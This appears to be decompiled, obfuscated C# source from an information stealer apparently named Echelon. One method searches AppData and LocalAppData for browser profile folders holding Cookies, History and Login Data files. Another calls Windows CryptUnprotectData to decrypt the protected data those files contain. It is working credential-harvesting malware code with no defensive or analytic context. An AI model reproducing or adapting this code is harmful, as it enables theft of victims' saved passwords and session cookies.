using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

internal class t
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct a
	{
		public int a;

		public int b;

		public IntPtr c;

		public string d;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct b
	{
		public int a;

		public IntPtr b;
	}

	public static List<string> a()
	{
		try
		{
			List<string> list = new List<string>();
			string[] directories = Directory.GetDirectories(Global.AppDate);
			string[] directories2 = Directory.GetDirectories(Global.LocalData);
			for (int i = 0; i < directories.Length; i++)
			{
				string[] files = Directory.GetFiles(directories[i]);
				for (int j = 0; j < files.Length; j++)
				{
					if (Path.GetFileName(files[j]) == "Cookies")
					{
						list.Add(directories[i]);
					}
				}
				files = Directory.GetDirectories(directories[i]);
				foreach (string text in files)
				{
					string[] files2 = Directory.GetFiles(text);
					for (int k = 0; k < files2.Length; k++)
					{
						if (Path.GetFileName(files2[k]) == "History")
						{
							list.Add(text);
						}
					}
					files2 = Directory.GetDirectories(text);
					foreach (string text2 in files2)
					{
						string[] files3 = Directory.GetFiles(text2);
						for (int l = 0; l < files3.Length; l++)
						{
							if (Path.GetFileName(files3[l]) == "Login Data")
							{
								list.Add(text2);
							}
						}
						try
						{
							files3 = Directory.GetDirectories(text2);
							foreach (string text3 in files3)
							{
								string[] files4 = Directory.GetFiles(text3);
								for (int m = 0; m < files4.Length; m++)
								{
									if (Path.GetFileName(files4[m]) == "History-journal")
									{
										list.Add(text3);
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			for (int n = 0; n < directories2.Length; n++)
			{
				try
				{
					string[] files = Directory.GetFiles(directories2[n]);
					for (int j = 0; j < files.Length; j++)
					{
						if (Path.GetFileName(files[j]) == "Cookies")
						{
							list.Add(directories2[n]);
						}
					}
					files = Directory.GetDirectories(directories2[n]);
					foreach (string text4 in files)
					{
						string[] files2 = Directory.GetFiles(text4);
						for (int k = 0; k < files2.Length; k++)
						{
							if (Path.GetFileName(files2[k]) == "History")
							{
								list.Add(text4);
							}
						}
						files2 = Directory.GetDirectories(text4);
						foreach (string text5 in files2)
						{
							string[] files3 = Directory.GetFiles(text5);
							for (int l = 0; l < files3.Length; l++)
							{
								if (Path.GetFileName(files3[l]) == "Login Data")
								{
									list.Add(text5);
								}
							}
							try
							{
								files3 = Directory.GetDirectories(text5);
								foreach (string text6 in files3)
								{
									string[] files4 = Directory.GetFiles(text6);
									for (int m = 0; m < files4.Length; m++)
									{
										if (Path.GetFileName(files4[m]) == "History-journal")
										{
											list.Add(text6);
										}
									}
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, EntryPoint = "CryptUnprotectData", SetLastError = true)]
	private static extern bool b(ref b av, ref string aw, ref b ax, IntPtr ay, ref a az, int ba, ref b bb);

	public static byte[] c(byte[] bc, byte[] bd = null)
	{
		b bb = default(b);
		b av = default(b);
		b ax = default(b);
		a a = default(a);
		a.a = Marshal.SizeOf(typeof(a));
		a.b = 0;
		a.c = IntPtr.Zero;
		a.d = null;
		a az = a;
		string aw = string.Empty;
		try
		{
			try
			{
				if (bc == null)
				{
					bc = new byte[0];
				}
				av.b = Marshal.AllocHGlobal(bc.Length);
				av.a = bc.Length;
				Marshal.Copy(bc, 0, av.b, bc.Length);
			}
			catch
			{
			}
			try
			{
				if (bd == null)
				{
					bd = new byte[0];
				}
				ax.b = Marshal.AllocHGlobal(bd.Length);
				ax.a = bd.Length;
				Marshal.Copy(bd, 0, ax.b, bd.Length);
			}
			catch
			{
			}
			b(ref av, ref aw, ref ax, IntPtr.Zero, ref az, 1, ref bb);
			byte[] array = new byte[bb.a];
			Marshal.Copy(bb.b, array, 0, bb.a);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (bb.b != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(bb.b);
			}
			if (av.b != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(av.b);
			}
			if (ax.b != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(ax.b);
			}
		}
		return new byte[0];
	}
}
